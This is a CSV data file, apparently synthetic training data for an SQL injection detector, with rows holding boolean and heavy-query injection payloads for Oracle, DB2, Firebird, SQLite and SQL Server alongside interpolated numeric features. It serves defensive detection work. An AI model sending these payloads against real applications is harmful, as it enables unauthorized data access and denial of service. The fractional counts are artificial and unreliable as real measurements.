id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000271,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,0.8603509897151782,78.75373164690257,27.092266053419117,3.754700034904127,19.330732796741728,20.04613302670956,29.330732796741728,10.04613302670956,0.24423064330671104,0.25576935669328893,0.37335174229499335,0.12664825770500665,1.7615332566773898,0.0,0.4769334866452204,0.0,0.0,2.0,0.0,3.523066513354779,0.0,0.0,0.7615332566773897,4.0,1.0,0.0,0.23846674332261017,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.7615332566773898,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7615332566773896
SMOTE_000272,attack,boolean,"1  )   as qeav where 8127  =  8127 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000095,0.8922240899470121,381.96397709567543,31.0,3.348234250546044,103.0,53.57165302132694,173.49960721267786,51.892716861670664,0.26969114523586907,0.1403567735081578,0.4541325256256366,0.13581955563033654,0.7141734893365319,0.0,1.642913255331734,0.0,0.0,3.0,0.0,35.5356301170024,0.0,0.0,1.0,14.642913255331734,0.17854337233413298,0.0,0.8214566276658669,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.821456627665867,0.0,1.178543372334133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000273,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,2.0109298495047203,104.929595859093,28.5422543572315,3.911196192102289,49.352139431408,11.661965142148002,32.830982571074,11.084508714463,0.45928021501916483,0.11647398078300852,0.318442779246529,0.1058030249512977,0.0,0.5422543572315,0.0,0.0,1.0,1.0,0.0,4.9154912855370005,0.0,0.4577456427685001,1.5422543572315,2.0,0.0,0.5422543572315,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.45774564276850005,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,1.0133596210979532,39.38474205233865,15.077113078507947,2.80157228069255,2.307628973830681,11.07711307850795,20.0,6.000000000000002,0.058905049242467145,0.2805708016527989,0.5080954993113338,0.15242864979340012,1.0,0.0,0.6923710261693159,0.0,0.0,1.0,0.0,3.0,0.30762897383068405,0.0,0.0,1.6923710261693157,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.30762897383068405,0.6923710261693159,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000275,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000124,0.22844038785946533,119.7759990419729,28.605224372486475,3.661859583413737,39.68408124162159,13.93420406208108,47.61828530370267,18.539428434567554,0.3300731742472607,0.1178909155183863,0.39705835413082363,0.1549775561035294,3.0657959379189204,0.0,0.0,0.0,0.0,1.0657959379189204,0.0,9.605224372486477,0.9342040620810794,1.0,2.8684081241621593,1.06579593791892,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0657959379189204,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9342040620810796,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,0.1545035220616676,78.0,28.72893599525719,3.9413346598541885,23.5740422782613,15.845106283004107,26.542128009485623,12.038723429248973,0.3022313112597602,0.2031423882436424,0.3402836924293028,0.15434260806729452,0.0,3.9999999999999996,1.0,0.0,0.0,1.0387234292489729,0.0,4.077446858497947,0.0,0.961276570751027,0.9612765707510271,2.038723429248973,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000071,3.42915262004621,158.87665511058756,37.303334984201776,4.2289521887608545,58.820009905210654,25.303334984201776,51.26998514218402,23.483325078991122,0.37233504380934695,0.15978357122339967,0.32104700958255633,0.146834375384697,4.651667492100888,0.0,1.9550024763026637,0.0,0.0,2.0,0.0,7.438327555293785,0.0,0.6966650157982242,0.3483325078991122,9.348332507899112,1.0,0.0,0.6516674921008878,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,0.6516674921008878,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6516674921008879,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6516674921008879,0.6516674921008879,5.606669968403552
SMOTE_000278,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,0.097424281792023,142.2210979483294,32.03158542118991,4.148935441336109,69.22109794832939,16.0,41.0,16.0,0.486678332083753,0.1125088587213692,0.2883039504735086,0.11250885872136922,0.03158542118991248,0.9684145788100875,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.03158542118991242,0.9684145788100875,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000279,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000067,0.8599245986282477,250.4951745026558,37.228831562684434,3.788539286013837,73.14415781342215,36.29153262507377,100.66452200118034,40.394962062979516,0.2908351670802561,0.14734550916315176,0.40096526939521754,0.16085405436137462,0.0,1.0,2.0,0.0,0.0,2.0,0.0,21.520364187758204,0.0,1.645766312536886,3.645766312536886,12.583065250147545,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.291532625073772,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.291532625073772
SMOTE_000280,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,0.028791892970845476,142.75086826798196,30.980836020613996,3.875291147574076,71.93292607214899,8.0,44.865852144297975,17.95209005153499,0.5039953327967608,0.05606317935904276,0.3142088210253674,0.12573266681882905,0.0,0.990418010306998,2.0,0.0,1.0,1.0,0.0,6.971254030920995,0.9904180103069979,0.0,2.0,4.0,0.0,0.9904180103069982,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000047,1.1343248970342172,44.44044344087946,16.050092383516557,3.455743389199036,6.0500923835165565,18.48014781362649,14.100184767033113,5.810018476703311,0.1309154471070653,0.42181091759192546,0.3100913947188171,0.1371822405821922,0.18998152329668883,0.0,3.0,0.0,0.0,1.8100184767033112,0.0,0.8100184767033127,0.0,0.0,0.0,4.810018476703311,0.1899815232966886,0.0,1.0,0.0,0.0,1.0,0.8100184767033113,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.8100184767033112,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.810018476703311
SMOTE_000282,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.8641926309436347,133.66584924616058,30.0,4.070729401782103,72.84987738692408,5.1331698492321145,37.83292462308029,17.849877386924085,0.5467083593645863,0.037710216623578346,0.2821109389853598,0.13347048502647557,0.0,3.283292462308028,0.0,0.0,1.0,1.2832924623080284,0.0,4.566584924616056,1.2832924623080284,0.0,2.716707537691972,2.283292462308028,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.2832924623080282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2832924623080286
SMOTE_000283,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R000141,1.2667062260135815,125.5431887184669,28.308637743693378,4.16542672876766,84.0,3.30863774369338,25.61727548738676,12.617275487386756,0.6693155881250801,0.02629666879611016,0.2039861491919408,0.1004015938868689,2.074086768919866,0.925913231080134,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,2.308637743693378,1.0,0.6913622563066221,0.30863774369337804,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000284,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000098,1.7674290806438764,218.45170638349924,29.0,3.4770592072545417,114.94502102655841,12.0,68.5066853569408,23.0,0.5261756886180138,0.05501329349376423,0.31336887202517383,0.10544214586304809,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.876671339235203,1.123328660764797,0.0,6.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.4383356696176013,0.5616643303823986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000285,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,0.9077205895764485,141.52456042555906,31.52456042555906,4.1371066979434925,68.52456042555906,16.47543957444094,39.81140106389765,16.71315936166141,0.4841696635344976,0.11645470084314227,0.2812229362990717,0.1181526993232885,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.7622802127795305,0.0,1.18859893610235,2.47543957444094,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000286,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000091,1.886399128964334,165.8155513484811,32.84030680355303,4.076090746554154,72.3953979467046,19.26046020532954,50.26046020532954,23.899232991117433,0.4319832203413213,0.11785242411115293,0.3062514101679015,0.14391294537962424,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.840306803553027,0.0,3.3193863928939464,2.73953979467046,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,2.0,0.42015340177651345,0.5798465982234865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000287,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,1.9125487210486785,111.69825632641428,28.532385306119306,3.828087190182607,49.10110040805636,10.338073469403477,38.194311836715826,14.064770612238611,0.42582198276224664,0.0990921323678576,0.34710462736378134,0.12798125750611447,0.0,0.4676146938806952,2.0,0.0,1.0,1.0,0.0,6.0,0.0,0.46761469388069515,1.532385306119305,4.0,0.0,0.4676146938806952,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.5323853061193047,0.46761469388069526,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000288,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.1436213053261245,158.0,36.212548307474755,4.180813279946896,81.51216184767672,16.0,44.27528984484852,16.212548307474755,0.5158997585295996,0.10126582278481013,0.2802233534484084,0.10261106523718198,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.212548307474754,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000289,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000127,1.4507470359644512,146.33732237483483,31.90119671245045,4.146327286987914,70.48552730615916,18.0,37.58433059370871,20.267464474966967,0.48140059034590843,0.12347893737736486,0.25685994096540915,0.13826053131131755,0.9505983562252246,0.6831338812582586,2.0,0.0,1.0,2.0,0.0,4.316866118741742,0.0,5.0,4.0,5.316866118741742,0.3168661187417414,0.6831338812582586,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.3168661187417414,0.0,1.0,1.0,0.31686611874174153,0.6831338812582585,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.316866118741742
SMOTE_000290,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000035,0.4548289770315554,91.19635028004359,20.19635028004359,2.9641589647282665,14.996958566702993,13.299087570010897,47.800608286659404,15.099695856670298,0.1635051598129258,0.1456824975664939,0.5251230863134264,0.16568925630715392,4.0,0.0,0.0996958566702989,0.0,0.9003041433297012,1.9003041433297012,0.0,8.0,0.0,0.0996958566702989,0.09969585667029901,2.9003041433297008,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.9003041433297012,0.09969585667029895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000106,1.3011227467836055,40.83889121249763,12.0,2.6357988825391816,2.0,12.0,20.0,6.838891212497613,0.049001319985121916,0.2940079199107314,0.49001319985121894,0.16697756025292781,1.0,0.0,1.8388912124976107,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.8388912124976105,1.0,0.0,0.4194456062488053,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000292,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000038,0.43504119818397585,254.18228777411628,36.136285370980616,3.7928143913690757,80.90971703215504,29.0,100.0,44.27257074196124,0.318246007492275,0.11409896298213446,0.3934446999383947,0.17421032958719584,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.27257074196123865,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000293,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,1.4381241473856539,115.55233440175294,29.046770417855686,3.809836223644015,51.93540835711374,10.383073955360784,38.14031125356706,15.093540835711373,0.43184189165345305,0.09791038215411009,0.33795437410876045,0.13229335208367646,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.5233852089278432,0.4766147910721567,1.5233852089278432,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000294,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,5.957254833369701,117.41199758233032,28.80675293277017,3.946399939361614,55.26903761091173,12.487428226047188,35.57147998570929,14.084051759662103,0.4584805533660536,0.10125924667187602,0.3144375143115034,0.125822685650567,0.0,1.319324706722983,2.0,0.0,1.0,2.319324706722983,0.3193247067229829,3.403376466385085,0.0,0.0,1.680675293277017,5.319324706722983,0.0,1.0,1.0,0.0,0.0,1.0,0.680675293277017,0.3193247067229829,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.319324706722983,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.319324706722983
SMOTE_000295,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,0.3073543966651451,144.0,31.895774501212635,4.157762706986073,83.31267649636209,8.0,36.79154900242527,15.895774501212635,0.5785602534469589,0.05555555555555555,0.2554968680723977,0.11038732292508774,4.0,0.0,0.0,0.0,1.0,1.8957745012126364,0.0,4.0,0.0,0.0,2.0,2.895774501212636,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.8957745012126361,0.10422549878736359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,1.3083722861555018,41.17186046081869,13.656279078362612,2.784758499003552,2.0,12.0,20.0,7.171860460818694,0.04860492802283489,0.29162956813700935,0.48604928022834887,0.17371622361180689,1.0,0.0,2.1718604608186936,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.1718604608186936,1.0,0.0,0.5859302304093467,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000297,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000018,0.7277538851780786,123.27940643128636,32.49764748549709,3.635457508223944,34.25117625725146,15.0,53.02352514502909,21.004705029005816,0.27951654047397884,0.12253574717290866,0.4274913285943576,0.17045638375875488,6.0,0.0,0.0,1.0,0.0,2.0,0.0,9.004705029005818,1.9999999999999998,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.2511762572514544,0.7488237427485456,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,2.1146742475542917,38.028836229490935,15.0,2.9031837217137637,2.5144181147454674,10.456745655763601,18.057672458981862,7.0,0.06581829368440778,0.2761978894728774,0.4737855171936758,0.18419829964903914,0.4855818852545333,0.5144181147454667,0.48558188525453316,0.0,0.0,1.0,0.0,2.5144181147454665,0.9999999999999998,0.0,0.0,1.4855818852545335,0.48558188525453333,0.5144181147454667,0.0,1.0000000000000002,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.5144181147454667,0.4855818852545333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
